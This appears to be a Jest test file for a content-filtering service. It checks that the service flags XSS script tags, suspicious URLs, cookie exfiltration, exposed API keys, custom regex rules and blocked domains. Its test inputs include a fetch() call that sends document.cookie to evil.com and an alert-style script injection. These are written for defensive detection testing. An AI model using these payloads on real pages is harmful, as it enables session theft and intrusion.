import { ContentFilter } from '../service';

describe('ContentFilter', () => {
  let filter: ContentFilter;

  beforeEach(() => {
    filter = new ContentFilter({
      enableHeuristics: true,
      enableAIAnalysis: false,
      enableCustomRules: true,
    });
  });

  describe('filterContent', () => {
    it('should detect and block JavaScript code blocks', async () => {
      const maliciousContent = 'Hello <script>alert("XSS")</script> world';
      const result = await filter.filterContent(maliciousContent);
      
      expect(result.isFiltered).toBe(true);
      expect(result.filteredContent).toContain('[CONTENT BLOCKED: MALICIOUS_CODE]');
      expect(result.matches.length).toBeGreaterThan(0);
      expect(result.matches[0].type).toBe('malicious_code');
    });

    it('should detect suspicious URLs', async () => {
      const maliciousContent = 'Check this out: http://suspicious-site.xyz/steal';
      const result = await filter.filterContent(maliciousContent);
      
      expect(result.isFiltered).toBe(true);
      expect(result.matches.some(m => m.type === 'suspicious_url')).toBe(true);
    });

    it('should detect data exfiltration patterns', async () => {
      const maliciousContent = 'fetch(`http://evil.com/steal?data=${encodeURIComponent(document.cookie)}`)';
      const result = await filter.filterContent(maliciousContent);
      
      expect(result.isFiltered).toBe(true);
      expect(result.matches.some(m => m.type === 'data_exfiltration')).toBe(true);
    });

    it('should detect sensitive data patterns', async () => {
      const sensitiveContent = 'API_KEY=abc123def456';
      const result = await filter.filterContent(sensitiveContent);
      
      expect(result.isFiltered).toBe(true);
      expect(result.matches.some(m => m.type === 'sensitive_data')).toBe(true);
    });

    it('should allow safe content', async () => {
      const safeContent = 'This is a normal message without any malicious content.';
      const result = await filter.filterContent(safeContent);
      
      expect(result.isFiltered).toBe(false);
      expect(result.matches.length).toBe(0);
      expect(result.filteredContent).toBe(safeContent);
    });
  });

  describe('analyzeContent', () => {
    it('should analyze content and return risk score', async () => {
      const maliciousContent = '<script>alert(1)</script> and API_KEY=abc123';
      const result = await filter.analyzeContent(maliciousContent);
      
      expect(result.isMalicious).toBe(true);
      expect(result.riskScore).toBeGreaterThan(0.5);
      expect(result.categories).toContain('malicious_code');
      expect(result.categories).toContain('sensitive_data');
      expect(result.details.codeInjection).toBe(true);
      expect(result.details.sensitiveData).toBe(true);
    });
  });

  describe('rule management', () => {
    it('should add and apply custom rules', async () => {
      const ruleId = filter.addRule({
        name: 'Test Rule',
        description: 'Test custom rule',
        type: 'regex',
        pattern: /test-pattern/gi,
        severity: 'high',
        action: 'block',
        enabled: true,
        tags: ['test'],
      });
      
      const content = 'This is a test-pattern that should be blocked';
      const result = await filter.filterContent(content);
      
      expect(result.isFiltered).toBe(true);
      expect(result.matches.some(m => m.metadata?.ruleId === ruleId)).toBe(true);
      expect(filter.getRule(ruleId)).toBeDefined();
      
      // Test rule removal
      expect(filter.removeRule(ruleId)).toBe(true);
      expect(filter.getRule(ruleId)).toBeUndefined();
    });
  });

  describe('configuration', () => {
    it('should respect allowed domains', async () => {
      const customFilter = new ContentFilter({
        allowedDomains: ['example.com'],
        blockedDomains: ['evil.com'],
      });
      
      const allowedUrl = 'https://example.com/api';
      const blockedUrl = 'https://evil.com/steal';
      
      const result1 = await customFilter.filterContent(`Visit ${allowedUrl}`);
      expect(result1.isFiltered).toBe(false);
      
      const result2 = await customFilter.filterContent(`Visit ${blockedUrl}`);
      expect(result2.isFiltered).toBe(true);
    });
  });
});
